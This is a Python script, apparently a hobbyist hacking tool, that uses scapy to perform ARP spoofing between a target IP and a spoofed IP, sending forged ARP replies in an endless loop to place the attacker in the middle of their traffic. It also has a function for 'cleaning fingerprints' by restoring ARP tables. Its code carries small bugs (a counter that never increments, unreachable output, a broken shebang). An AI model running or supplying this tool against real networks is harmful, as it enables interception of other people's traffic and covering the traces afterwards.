#! /usr/bin python3


from time import sleep
import argparse
import scapy.all as scapy


def init_banner():
    arguments = get_user_arguments()
    display_packet_status(arguments)


def get_user_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target',
                        help='IP of the target')
    parser.add_argument('-s', '--spoof', dest='spoof',
                        help='Spoof IP')

    arguments = parser.parse_args()

    return arguments


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(
        arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def create_packet(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac, psrc=spoof_ip)

    return packet


def display_packet_status(arguments):
    sent_packets_count = 0

    try:
        while True:
            sent_packets_count = + 2
            start_spoof(arguments.target, arguments.spoof)
            start_spoof(arguments.spoof, arguments.target)

            print('\r[+] Sending packets...')
            sleep(2)

        print(f'\r[+] Total of packets sent: {sent_packets_count}', end='')
    except KeyboardInterrupt:
        print('[+] Do not forget to clean the fingerprints! Run -fp')


def clear_fingerprints(destination_ip, source_ip):
    destination_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    packet = scapy.ARP(op=2,
                       pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip,
                       hwsrc=source_mac)

    scapy.send(packet, count=4, verbose=False)


def start_spoof(target, spoof):
    packet = create_packet(target, spoof)
    scapy.send(packet, verbose=False)


init_banner()
